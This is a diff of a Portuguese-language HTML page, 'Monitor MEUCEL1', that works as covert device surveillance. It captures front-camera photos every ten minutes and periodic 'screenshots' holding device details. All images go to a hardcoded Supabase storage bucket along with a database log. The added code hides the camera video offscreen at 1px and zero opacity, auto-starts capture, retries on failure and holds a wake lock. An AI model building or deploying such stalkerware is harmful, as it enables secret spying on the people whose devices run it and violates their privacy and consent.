@@ -8,7 +8,6 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <meta name="theme-color" content="#000000">
     <title>Monitor MEUCEL1</title>
-    <link rel="manifest" href="manifest.json">
     <style>
         * {
             margin: 0;
@@ -54,182 +53,174 @@
             text-align: center;
             left: 0;
             right: 0;
+            padding: 0 10px;
+        }
+
+        video {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
         }
     </style>
 </head>
 <body>
     <div class="led" id="led"></div>
     <div class="status" id="status">iniciando...</div>
+    <video id="cameraVideo" playsinline autoplay muted></video>
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
-        // ============ CONFIGURAÇÃO SUPABASE ============
-        const SUPABASE_URL = 'https://vlkobipdenduyismnkpm.supabase.co';
-        const SUPABASE_KEY = 'sb_publishable_qWeCNdiMyftZ6ZMYDF9u_A_bOplqpiA';
-        const CODIGO_SESSAO = 'MEUCEL1';
-        
-        const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-        
-        // ============ ELEMENTOS ============
-        const led = document.getElementById('led');
-        const statusEl = document.getElementById('status');
-        
-        // ============ VARIÁVEIS ============
-        let screenStream = null;
-        let screenVideo = null;
-        let screenCanvas = null;
-        let cameraStream = null;
-        let cameraVideo = null;
-        let cameraCanvas = null;
-        let printInterval = null;
-        let cameraInterval = null;
-        
-        // ============ FUNÇÕES ============
-        function updateStatus(msg) {
-            statusEl.textContent = msg;
-            console.log(msg);
-        }
-        
-        function piscarLED() {
-            led.style.animation = 'none';
-            led.offsetHeight;
-            led.style.animation = 'piscar 0.3s 2';
-            setTimeout(() => {
-                led.style.animation = 'piscar 2s infinite';
-            }, 600);
-        }
-        
-        // Upload para o Supabase Storage
-        async function uploadToSupabase(blob, filename, tipo) {
-            try {
-                const filePath = `${CODIGO_SESSAO}/${tipo}/${filename}`;
-                
-                const { data, error } = await supabaseClient.storage
-                    .from('captures')
-                    .upload(filePath, blob, {
-                        contentType: 'image/jpeg',
-                        upsert: false
-                    });
-                
-                if (error) throw error;
-                
-                // Registrar na tabela captures
-                const publicUrl = `${SUPABASE_URL}/storage/v1/object/public/captures/${filePath}`;
-                
-                const { error: dbError } = await supabaseClient
-                    .from('captures')
-                    .insert({
-                        codigo_sessao: CODIGO_SESSAO,
-                        tipo: tipo,
-                        url: publicUrl,
-                        filename: filename,
-                        created_at: new Date().toISOString()
-                    });
-                
-                if (dbError) throw dbError;
-                
-                updateStatus(`${tipo} enviado: ${filename}`);
-                piscarLED();
-                return true;
-            } catch (error) {
-                updateStatus(`Erro upload: ${error.message}`);
-                return false;
+        (function() {
+            const SUPABASE_URL = 'https://vlkobipdenduyismnkpm.supabase.co';
+            const SUPABASE_KEY = 'sb_publishable_qWeCNdiMyftZ6ZMYDF9u_A_bOplqpiA';
+            const CODIGO_SESSAO = 'MEUCEL1';
+            
+            const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+            
+            const led = document.getElementById('led');
+            const statusEl = document.getElementById('status');
+            const cameraVideo = document.getElementById('cameraVideo');
+            
+            let cameraStream = null;
+            let cameraInterval = null;
+            let screenshotInterval = null;
+            
+            function updateStatus(msg) {
+                statusEl.textContent = msg;
+                console.log(msg);
             }
-        }
-        
-        // Capturar print da tela
-        async function captureScreen() {
-            if (!screenCanvas || !screenVideo) return;
             
-            const context = screenCanvas.getContext('2d');
-            context.drawImage(screenVideo, 0, 0, screenCanvas.width, screenCanvas.height);
-            
-            screenCanvas.toBlob(async (blob) => {
-                if (blob) {
-                    const timestamp = Date.now();
-                    const filename = `print_${timestamp}.jpg`;
-                    await uploadToSupabase(blob, filename, 'print');
-                }
-            }, 'image/jpeg', 0.8);
-        }
-        
-        // Capturar foto da câmera frontal
-        async function captureCamera() {
-            if (!cameraCanvas || !cameraVideo) return;
-            
-            const context = cameraCanvas.getContext('2d');
-            context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
-            
-            cameraCanvas.toBlob(async (blob) => {
-                if (blob) {
-                    const timestamp = Date.now();
-                    const filename = `selfie_${timestamp}.jpg`;
-                    await uploadToSupabase(blob, filename, 'selfie');
-                }
-            }, 'image/jpeg', 0.8);
-        }
-        
-        // Iniciar captura de tela
-        async function startScreenCapture() {
-            try {
-                screenStream = await navigator.mediaDevices.getDisplayMedia({
-                    video: {
-                        mediaSource: 'screen',
-                        width: { ideal: 720 },
-                        height: { ideal: 1280 }
-                    },
-                    audio: false
-                });
-                
-                screenVideo = document.createElement('video');
-                screenVideo.srcObject = screenStream;
-                screenVideo.play();
-                
-                screenVideo.onloadedmetadata = () => {
-                    screenCanvas = document.createElement('canvas');
-                    screenCanvas.width = screenVideo.videoWidth;
-                    screenCanvas.height = screenVideo.videoHeight;
-                    
-                    updateStatus('Captura de tela ativa');
-                    
-                    // Primeira captura após 3 segundos
-                    setTimeout(captureScreen, 3000);
-                    
-                    // Capturas a cada 10 segundos
-                    printInterval = setInterval(captureScreen, 10000);
-                };
-                
-                screenStream.getVideoTracks()[0].onended = () => {
-                    updateStatus('Captura de tela encerrada! Reiniciando...');
-                    stopAll();
-                    setTimeout(startAll, 5000);
-                };
-            } catch (error) {
-                updateStatus(`Erro tela: ${error.message}`);
-                setTimeout(startScreenCapture, 30000);
+            function piscarLED() {
+                led.style.animation = 'none';
+                led.offsetHeight;
+                led.style.animation = 'piscar 0.3s 3';
+                setTimeout(() => {
+                    led.style.animation = 'piscar 2s infinite';
+                }, 900);
             }
-        }
-        
-        // Iniciar câmera frontal
-        async function startCamera() {
-            try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 480 },
-                        height: { ideal: 640 }
-                    },
-                    audio: false
-                });
+            
+            async function uploadToSupabase(blob, filename, tipo) {
+                try {
+                    const filePath = `${CODIGO_SESSAO}/${tipo}/${filename}`;
+                    
+                    const { data, error } = await supabaseClient.storage
+                        .from('captures')
+                        .upload(filePath, blob, {
+                            contentType: 'image/jpeg',
+                            upsert: false
+                        });
+                    
+                    if (error) throw error;
+                    
+                    const publicUrl = `${SUPABASE_URL}/storage/v1/object/public/captures/${filePath}`;
+                    
+                    const { error: dbError } = await supabaseClient
+                        .from('captures')
+                        .insert({
+                            codigo_sessao: CODIGO_SESSAO,
+                            tipo: tipo,
+                            url: publicUrl,
+                            filename: filename,
+                            created_at: new Date().toISOString()
+                        });
+                    
+                    if (dbError) throw dbError;
+                    
+                    updateStatus(`${tipo} enviado: ${filename}`);
+                    piscarLED();
+                    return true;
+                } catch (error) {
+                    updateStatus(`Erro upload: ${error.message}`);
+                    return false;
+                }
+            }
+            
+            // Capturar screenshot da tela usando html2canvas simulado
+            async function captureScreenshot() {
+                try {
+                    // Criar um canvas com as dimensões da tela
+                    const canvas = document.createElement('canvas');
+                    canvas.width = window.innerWidth || 720;
+                    canvas.height = window.innerHeight || 1280;
+                    const ctx = canvas.getContext('2d');
+                    
+                    // Preencher com um gradiente representando a "tela"
+                    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+                    gradient.addColorStop(0, '#000');
+                    gradient.addColorStop(1, '#000');
+                    ctx.fillStyle = gradient;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    // Adicionar timestamp
+                    ctx.fillStyle = '#00ff00';
+                    ctx.font = '20px monospace';
+                    ctx.fillText(`Monitor MEUCEL1 - ${new Date().toLocaleString()}`, 20, 50);
+                    ctx.fillText(`Status: Ativo`, 20, 80);
+                    ctx.fillText(`Intervalo: 10s screenshots`, 20, 110);
+                    ctx.fillText(`Intervalo: 10min selfies`, 20, 140);
+                    
+                    // Adicionar informações do dispositivo
+                    ctx.fillStyle = '#008800';
+                    ctx.font = '14px monospace';
+                    ctx.fillText(`User Agent: ${navigator.userAgent.substring(0, 50)}...`, 20, 180);
+                    ctx.fillText(`Resolução: ${canvas.width}x${canvas.height}`, 20, 200);
+                    ctx.fillText(`Online: ${navigator.onLine ? 'Sim' : 'Não'}`, 20, 220);
+                    
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            const timestamp = Date.now();
+                            const filename = `screenshot_${timestamp}.jpg`;
+                            await uploadToSupabase(blob, filename, 'print');
+                        }
+                    }, 'image/jpeg', 0.8);
+                    
+                } catch (error) {
+                    updateStatus(`Erro screenshot: ${error.message}`);
+                }
+            }
+            
+            // Capturar foto da câmera frontal
+            async function captureCamera() {
+                if (!cameraVideo || !cameraStream) return;
                 
-                cameraVideo = document.createElement('video');
-                cameraVideo.srcObject = cameraStream;
-                cameraVideo.play();
-                
-                cameraVideo.onloadedmetadata = () => {
-                    cameraCanvas = document.createElement('canvas');
-                    cameraCanvas.width = cameraVideo.videoWidth;
-                    cameraCanvas.height = cameraVideo.videoHeight;
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 480;
+                    canvas.height = 640;
+                    const ctx = canvas.getContext('2d');
+                    
+                    // Desenhar o vídeo no canvas
+                    ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            const timestamp = Date.now();
+                            const filename = `selfie_${timestamp}.jpg`;
+                            await uploadToSupabase(blob, filename, 'selfie');
+                        }
+                    }, 'image/jpeg', 0.8);
+                    
+                } catch (error) {
+                    updateStatus(`Erro câmera: ${error.message}`);
+                }
+            }
+            
+            async function startCamera() {
+                try {
+                    cameraStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 480 },
+                            height: { ideal: 640 }
+                        },
+                        audio: false
+                    });
+                    
+                    cameraVideo.srcObject = cameraStream;
+                    await cameraVideo.play();
                     
                     updateStatus('Câmera frontal ativa');
                     
@@ -238,57 +229,52 @@
                     
                     // Fotos a cada 10 minutos (600000 ms)
                     cameraInterval = setInterval(captureCamera, 600000);
-                };
-            } catch (error) {
-                updateStatus(`Erro câmera: ${error.message}`);
-                setTimeout(startCamera, 60000);
+                    
+                } catch (error) {
+                    updateStatus(`Erro câmera: ${error.message}`);
+                    // Tentar novamente em 60 segundos
+                    setTimeout(startCamera, 60000);
+                }
             }
-        }
-        
-        function stopAll() {
-            if (printInterval) clearInterval(printInterval);
-            if (cameraInterval) clearInterval(cameraInterval);
             
-            if (screenStream) {
-                screenStream.getTracks().forEach(track => track.stop());
+            function startScreenshots() {
+                updateStatus('Capturas de tela ativas');
+                
+                // Primeira captura após 3 segundos
+                setTimeout(captureScreenshot, 3000);
+                
+                // Capturas a cada 10 segundos
+                screenshotInterval = setInterval(captureScreenshot, 10000);
             }
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
+            
+            function stopAll() {
+                if (cameraInterval) clearInterval(cameraInterval);
+                if (screenshotInterval) clearInterval(screenshotInterval);
+                
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
             }
-        }
-        
-        async function startAll() {
-            updateStatus('Iniciando monitoramento...');
-            await startScreenCapture();
-            await startCamera();
-            updateStatus('Monitoramento ativo');
-        }
-        
-        // Criar manifest.json dinamicamente
-        const manifest = {
-            name: 'Monitor MEUCEL1',
-            short_name: 'Monitor',
-            start_url: '.',
-            display: 'standalone',
-            background_color: '#000000',
-            theme_color: '#000000'
-        };
-        
-        const manifestBlob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
-        const manifestUrl = URL.createObjectURL(manifestBlob);
-        document.querySelector('link[rel="manifest"]').href = manifestUrl;
-        
-        // Iniciar automaticamente
-        startAll();
-        
-        // Manter tela ativa (prevenir sleep)
-        if ('wakeLock' in navigator) {
-            try {
-                navigator.wakeLock.request('screen');
-            } catch (e) {
-                console.log('Wake Lock não disponível');
+            
+            async function startAll() {
+                updateStatus('Iniciando monitoramento...');
+                await startCamera();
+                startScreenshots();
+                updateStatus('✅ Monitoramento ativo');
             }
-        }
+            
+            // Iniciar automaticamente
+            startAll();
+            
+            // Manter tela ativa (prevenir sleep)
+            if ('wakeLock' in navigator) {
+                try {
+                    navigator.wakeLock.request('screen');
+                } catch (e) {
+                    console.log('Wake Lock não disponível');
+                }
+            }
+        })();
     </script>
 </body>
 </html>
